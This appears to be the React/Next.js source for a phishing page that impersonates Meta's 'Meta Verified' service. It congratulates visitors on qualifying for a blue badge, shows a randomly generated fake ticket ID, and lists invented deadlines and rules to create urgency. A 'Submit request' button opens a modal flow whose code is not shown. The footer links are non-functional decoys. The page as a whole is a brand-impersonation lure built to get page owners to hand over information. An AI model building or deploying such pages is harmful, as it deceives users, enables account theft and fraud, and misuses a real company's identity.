"use client";

import { ModalFlowProvider } from "@/components/ModalFlow";
import { ButtonWithModal } from "@/components/ButtonWithModal";
import Image from "next/image";
import { useEffect, useState } from "react";

export default function AccountsCenterPage() {
  const [ticketId, setTicketId] = useState("");

  useEffect(() => {
    const savedId = localStorage.getItem("ticket_id");
    if (savedId) {
      setTicketId(savedId);
    } else {
      const generateId = () => {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        const part = (len: number) => Array.from({ length: len }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
        return `${part(4)}-${part(4)}-${part(4)}`;
      };
      const newId = generateId();
      setTicketId(newId);
      localStorage.setItem("ticket_id", newId);
    }
  }, []);

  return (
    <ModalFlowProvider>
      <div className="min-h-screen bg-[#F0F2F5] text-[#171A1D] font-sans antialiased">
        <main className="mx-auto flex min-h-screen max-w-[738px] flex-col px-[15px] pt-[30px] pb-16">
          <section className="flex-1">
            <div className="mb-[24px]">
              <div className="mb-[16px]">
                <Image
                  src="/ic_blue.svg"
                  alt="Meta Verified badge"
                  width={48}
                  height={48}
                  className="h-12 w-12"
                />
              </div>
              <div className="text-left">
                <h1 className="text-[32px] font-bold leading-[40px] tracking-tight text-[#171A1D]" data-i18n="meta_verified_title">
                  Meta Verified - Rewards for you
                </h1>
                <p className="mt-[32px] text-[17px] font-bold leading-[24px] text-[#171A1D]" data-i18n="show_world">
                  Show the world that you mean business.
                </p>
              </div>
            </div>

            <div className="mt-[32px] space-y-[15px] text-[15px] leading-[22.5px] text-[#171A1D] text-left">
              <p data-i18n="congratulations">
                Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you&apos;ve built with your audience. We&apos;re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!
              </p>

              <p className="text-[#65676B]" data-i18n="ticket_id">
                Your ticket id: #{ticketId || "........"}
              </p>

              <div className="pt-4 space-y-[15px]">
                <h2 className="text-[17px] font-bold text-[#171A1D]" data-i18n="verified_badge_request_guide">
                  Verified Blue Badge Request Guide
                </h2>

                <div className="space-y-[15px] text-[#171A1D]">
                  <p data-i18n="rule_1">
                    - Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats
                  </p>
                  
                  <p data-i18n="rule_2">
                    - In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.
                  </p>

                  <p data-i18n="rule_3">
                    - Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.
                  </p>
                </div>
              </div>
            </div>

            <div className="mt-12 flex justify-center">
              <ButtonWithModal className="inline-flex h-12 w-[300px] items-center justify-center rounded-full bg-[#1877F2] text-[16px] font-semibold text-white shadow-sm transition hover:bg-blue-600 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-blue-500 focus-visible:ring-offset-2" data-i18n="submit_request">
                Submit request
              </ButtonWithModal>
            </div>
          </section>

          <footer className="mt-[30px] flex flex-wrap justify-center gap-x-6 gap-y-2 text-[12px] text-[#65676B]">
            <button className="hover:text-[#171A1D]" type="button" data-i18n="help_center">
              Help Center
            </button>
            <button className="hover:text-[#171A1D]" type="button" data-i18n="privacy_policy">
              Privacy Policy
            </button>
            <button className="hover:text-[#171A1D]" type="button" data-i18n="terms_of_service">
              Terms of Service
            </button>
            <button className="hover:text-[#171A1D]" type="button" data-i18n="community_standards">
              Community Standards
            </button>
            <span data-i18n="meta_copyright">Meta © 2026</span>
          </footer>
        </main>
      </div>
    </ModalFlowProvider>
  );
}
